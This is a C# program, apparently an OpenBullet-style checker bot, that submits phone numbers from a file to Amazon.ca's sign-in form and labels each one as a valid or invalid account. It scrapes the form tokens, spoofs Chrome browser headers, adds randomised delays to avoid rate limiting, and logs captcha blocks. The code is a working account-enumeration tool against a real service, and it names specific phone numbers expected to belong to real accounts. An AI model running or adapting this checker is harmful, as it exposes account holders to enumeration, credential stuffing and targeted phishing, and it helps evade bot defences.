using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Collections.Generic;
using System.Linq;

// Using Leaf.xNet from DLL
using Leaf.xNet;
using HttpStatusCode = Leaf.xNet.HttpStatusCode;

namespace OpenBulletTestBot
{
    class MixedTestBot
    {
        private static readonly string USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
        private static string resultsDir;
        private static string logFile;
        private static int validCount = 0;
        private static int invalidCount = 0;
        private static int blockedCount = 0;
        private static int unknownCount = 0;
        
        static void Main(string[] args)
        {
            Console.WriteLine(@"
================================================
MIXED TEST - OPENBULLET TEST BOT
Testing mix of valid and invalid numbers
================================================");

            // Initialize
            resultsDir = Path.Combine(Directory.GetCurrentDirectory(), $"TestResults_Mixed_{DateTime.Now:yyyyMMdd_HHmmss}");
            Directory.CreateDirectory(resultsDir);
            Directory.CreateDirectory(Path.Combine(resultsDir, "HTML_Responses"));
            logFile = Path.Combine(resultsDir, "test.log");
            
            // Load test numbers from file
            var numbersFile = Path.Combine(Directory.GetCurrentDirectory(), "mixed_test_numbers.txt");
            if (!File.Exists(numbersFile))
            {
                Console.WriteLine($"ERROR: File not found: {numbersFile}");
                return;
            }
            
            var testNumbers = File.ReadAllLines(numbersFile)
                .Where(line => !string.IsNullOrWhiteSpace(line))
                .Select(line => line.Trim())
                .ToArray();
            
            Console.WriteLine($"[INFO] Loaded {testNumbers.Length} numbers from file");
            Console.WriteLine("Expected: 3 valid (15142955315, 15145692379, 15149772071)");
            Console.WriteLine("Expected: Rest are invalid test numbers\n");
            Log("=== MIXED TEST STARTED ===");
            
            var signinUrl = "https://www.amazon.ca/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.ca%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=caflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0";
            
            int testCount = 0;
            foreach (var number in testNumbers)
            {
                testCount++;
                Console.WriteLine($"\n{new string('=', 50)}");
                Console.WriteLine($"Test #{testCount}/{testNumbers.Length}: {number}");
                
                var result = TestNumber(number, signinUrl);
                
                // Add delay to avoid rate limiting
                if (testCount < testNumbers.Length)
                {
                    int delay = 2000 + new Random().Next(1000, 3000); // 2-5 seconds random delay
                    Console.WriteLine($"  ⏱ Waiting {delay/1000.0:F1}s before next test...");
                    Thread.Sleep(delay);
                }
            }
            
            // Display summary
            Console.WriteLine($"\n\n{new string('=', 50)}");
            Console.WriteLine("FINAL RESULTS SUMMARY:");
            Console.WriteLine($"  ✓ VALID accounts: {validCount}");
            Console.WriteLine($"  ✗ INVALID accounts: {invalidCount}");
            Console.WriteLine($"  ⚠ BLOCKED (captcha): {blockedCount}");
            Console.WriteLine($"  ? UNKNOWN: {unknownCount}");
            Console.WriteLine($"  Total tested: {testNumbers.Length}");
            
            Console.WriteLine($"\nResults saved to: {resultsDir}");
            Console.WriteLine("\n[DONE] Test complete");
        }
        
        private static string TestNumber(string phoneNumber, string signinUrl)
        {
            try
            {
                using (var request = new HttpRequest())
                {
                    // Configure request
                    request.UserAgent = USER_AGENT;
                    request.KeepAlive = true;
                    request.AllowAutoRedirect = false;
                    request.ConnectTimeout = 15000;
                    request.ReadWriteTimeout = 15000;
                    request.Cookies = new CookieStorage();
                    
                    // Add browser headers
                    request.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
                    request.AddHeader("Accept-Language", "en-US,en;q=0.9");
                    request.AddHeader("Accept-Encoding", "gzip, deflate, br");
                    request.AddHeader("Sec-Ch-Ua", "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"");
                    request.AddHeader("Sec-Ch-Ua-Mobile", "?0");
                    request.AddHeader("Sec-Ch-Ua-Platform", "\"Windows\"");
                    request.AddHeader("Sec-Fetch-Dest", "document");
                    request.AddHeader("Sec-Fetch-Mode", "navigate");
                    request.AddHeader("Sec-Fetch-Site", "none");
                    request.AddHeader("Sec-Fetch-User", "?1");
                    request.AddHeader("Upgrade-Insecure-Requests", "1");
                    
                    // Step 1: GET signin page
                    Console.WriteLine("  → Getting signin page...");
                    Log($"[{phoneNumber}] Getting signin page");
                    
                    var response = request.Get(signinUrl);
                    
                    // Handle redirects
                    while (response.StatusCode == HttpStatusCode.Redirect || 
                           response.StatusCode == HttpStatusCode.MovedPermanently ||
                           response.StatusCode == HttpStatusCode.Found)
                    {
                        var location = response.Location;
                        if (string.IsNullOrEmpty(location)) break;
                        response = request.Get(location.StartsWith("http") ? location : "https://www.amazon.ca" + location);
                    }
                    
                    var html = response.ToString();
                    Log($"[{phoneNumber}] GET Response: {response.StatusCode}, {html.Length} chars");
                    
                    // Check if blocked already
                    if (html.Contains("captcha") || html.Contains("CAPTCHA"))
                    {
                        Console.WriteLine("  ⚠ BLOCKED: Captcha on initial page");
                        Log($"[{phoneNumber}] BLOCKED: Captcha on GET");
                        blockedCount++;
                        return "BLOCKED";
                    }
                    
                    // Save GET response
                    var htmlFile1 = Path.Combine(resultsDir, "HTML_Responses", $"{phoneNumber}_GET.html");
                    File.WriteAllText(htmlFile1, html);
                    
                    // Extract tokens
                    var appActionToken = ExtractValue(html, "name=\"appActionToken\" value=\"", "\"");
                    var appAction = ExtractValue(html, "name=\"appAction\" value=\"", "\"");
                    var prevRID = ExtractValue(html, "name=\"prevRID\" value=\"", "\"");
                    var workflowState = ExtractValue(html, "name=\"workflowState\" value=\"", "\"");
                    var subPageType = ExtractValue(html, "name=\"subPageType\" value=\"", "\"");
                    var openidReturnTo = ExtractValue(html, "name=\"openid.return_to\" value=\"", "\"");
                    var metadata1 = ExtractValue(html, "name=\"metadata1\" value=\"", "\"");
                    
                    if (string.IsNullOrEmpty(appActionToken))
                    {
                        Console.WriteLine("  ⚠ WARNING: No tokens found");
                        Log($"[{phoneNumber}] WARNING: No appActionToken");
                    }
                    
                    // Step 2: POST phone number
                    Console.WriteLine("  → Submitting phone number...");
                    Log($"[{phoneNumber}] Submitting phone number");
                    
                    // Build form data
                    var formData = new StringBuilder();
                    if (!string.IsNullOrEmpty(appActionToken))
                        formData.Append($"appActionToken={Uri.EscapeDataString(appActionToken)}&");
                    if (!string.IsNullOrEmpty(appAction))
                        formData.Append($"appAction={Uri.EscapeDataString(appAction)}&");
                    else
                        formData.Append("appAction=SIGNIN_PWD_COLLECT&");
                    if (!string.IsNullOrEmpty(subPageType))
                        formData.Append($"subPageType={Uri.EscapeDataString(subPageType)}&");
                    if (!string.IsNullOrEmpty(metadata1))
                        formData.Append($"metadata1={Uri.EscapeDataString(metadata1)}&");
                    if (!string.IsNullOrEmpty(openidReturnTo))
                        formData.Append($"openid.return_to={Uri.EscapeDataString(openidReturnTo)}&");
                    if (!string.IsNullOrEmpty(prevRID))
                        formData.Append($"prevRID={Uri.EscapeDataString(prevRID)}&");
                    if (!string.IsNullOrEmpty(workflowState))
                        formData.Append($"workflowState={Uri.EscapeDataString(workflowState)}&");
                    
                    formData.Append($"email={phoneNumber}&password=&create=0");
                    var postData = formData.ToString();
                    
                    // Set POST headers
                    request.Referer = signinUrl;
                    request.AddHeader("Origin", "https://www.amazon.ca");
                    request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                    request.AddHeader("Sec-Fetch-Site", "same-origin");
                    request.AddHeader("Cache-Control", "max-age=0");
                    
                    // POST to base URL
                    var submitUrl = "https://www.amazon.ca/ap/signin";
                    Log($"[{phoneNumber}] POSTing to: {submitUrl}");
                    
                    var submitResponse = request.Post(submitUrl, postData, "application/x-www-form-urlencoded");
                    
                    // Handle POST redirects
                    int redirectCount = 0;
                    while ((submitResponse.StatusCode == HttpStatusCode.Redirect || 
                            submitResponse.StatusCode == HttpStatusCode.MovedPermanently ||
                            submitResponse.StatusCode == HttpStatusCode.Found) && redirectCount < 5)
                    {
                        var location = submitResponse.Location;
                        if (string.IsNullOrEmpty(location)) break;
                        Log($"[{phoneNumber}] Redirect {++redirectCount}: {location}");
                        submitResponse = request.Get(location.StartsWith("http") ? location : "https://www.amazon.ca" + location);
                    }
                    
                    var responseHtml = submitResponse.ToString();
                    Log($"[{phoneNumber}] POST Response: {submitResponse.StatusCode}, {responseHtml.Length} chars");
                    
                    // Save POST response
                    var htmlFile2 = Path.Combine(resultsDir, "HTML_Responses", $"{phoneNumber}_POST.html");
                    File.WriteAllText(htmlFile2, responseHtml);
                    
                    // Analyze response
                    return AnalyzeResponse(phoneNumber, responseHtml);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"  ERROR: {ex.Message}");
                Log($"[{phoneNumber}] ERROR: {ex.Message}");
                unknownCount++;
                return "ERROR";
            }
        }
        
        private static string AnalyzeResponse(string phoneNumber, string html)
        {
            Console.WriteLine("  → Analyzing response...");
            
            // Extract title for logging
            var title = ExtractValue(html, "<title>", "</title>");
            Log($"[{phoneNumber}] Title: {title}");
            
            // Check for captcha/blocking first
            if (html.Contains("captcha") || html.Contains("CAPTCHA") || 
                html.Contains("automated access") || html.Contains("robot"))
            {
                Console.WriteLine("  ⚠ RESULT: BLOCKED (Captcha/Bot detection)");
                Log($"[{phoneNumber}] RESULT: BLOCKED");
                blockedCount++;
                return "BLOCKED";
            }
            
            // Check for OTP challenge (indicates valid account with extra security)
            bool hasOTPChallenge = html.Contains("Send OTP") || 
                                   html.Contains("OTPChallengeOptions") ||
                                   html.Contains("One Time Password") ||
                                   html.Contains("multi-factor authentication") ||
                                   html.Contains("two-step verification");
            
            // Check for actual password field (indicates valid account)
            bool hasPasswordField = Regex.IsMatch(html, @"<input[^>]*type\s*=\s*[""']password[""'][^>]*id\s*=\s*[""']ap_password[""'][^>]*>", RegexOptions.IgnoreCase);
            bool hasEnterPasswordText = html.Contains("Enter your password");
            
            // Check for error messages (indicates invalid account)
            bool hasCannotFindError = html.Contains("We cannot find an account") || 
                                      html.Contains("We can't find an account");
            bool hasWrongInvalidError = html.Contains("Wrong or Invalid") || 
                                        html.Contains("There was a problem");
            bool hasNoAccountError = html.Contains("No account found");
            
            // Check for create account option
            bool hasCreateAccount = html.Contains("Create your Amazon account");
            
            // Determine result
            string result;
            string reason;
            
            if (hasOTPChallenge)
            {
                result = "VALID";
                reason = "OTP challenge shown - account exists with extra security";
                Console.WriteLine($"  ✓ RESULT: VALID (OTP/2FA required)");
                validCount++;
            }
            else if (hasPasswordField && hasEnterPasswordText)
            {
                result = "VALID";
                reason = "Password field shown - account exists";
                Console.WriteLine($"  ✓ RESULT: VALID (Account exists)");
                validCount++;
            }
            else if (hasCannotFindError || hasWrongInvalidError || hasNoAccountError)
            {
                result = "INVALID";
                reason = "Error message - no account found";
                Console.WriteLine($"  ✗ RESULT: INVALID (No account)");
                invalidCount++;
            }
            else if (hasCreateAccount && !hasPasswordField)
            {
                result = "INVALID";
                reason = "Redirected to create account";
                Console.WriteLine($"  ✗ RESULT: INVALID (Create account shown)");
                invalidCount++;
            }
            else
            {
                result = "UNKNOWN";
                reason = "Could not determine from response";
                Console.WriteLine($"  ? RESULT: UNKNOWN");
                unknownCount++;
                
                // Log what we found for debugging
                Log($"[{phoneNumber}] Debug - OTP challenge: {hasOTPChallenge}");
                Log($"[{phoneNumber}] Debug - Password field: {hasPasswordField}");
                Log($"[{phoneNumber}] Debug - Enter password text: {hasEnterPasswordText}");
                Log($"[{phoneNumber}] Debug - Cannot find error: {hasCannotFindError}");
                Log($"[{phoneNumber}] Debug - Create account: {hasCreateAccount}");
            }
            
            Log($"[{phoneNumber}] RESULT: {result} - {reason}");
            
            // Save to summary
            var summaryFile = Path.Combine(resultsDir, "results_summary.txt");
            File.AppendAllText(summaryFile, $"{phoneNumber}: {result} - {reason}\n");
            
            return result;
        }
        
        private static string ExtractValue(string html, string start, string end)
        {
            try
            {
                int startIndex = html.IndexOf(start);
                if (startIndex == -1) return "";
                startIndex += start.Length;
                int endIndex = html.IndexOf(end, startIndex);
                if (endIndex == -1) return "";
                return html.Substring(startIndex, endIndex - startIndex);
            }
            catch
            {
                return "";
            }
        }
        
        private static void Log(string message)
        {
            var logEntry = $"[{DateTime.Now:HH:mm:ss}] {message}";
            File.AppendAllText(logFile, logEntry + Environment.NewLine);
        }
    }
}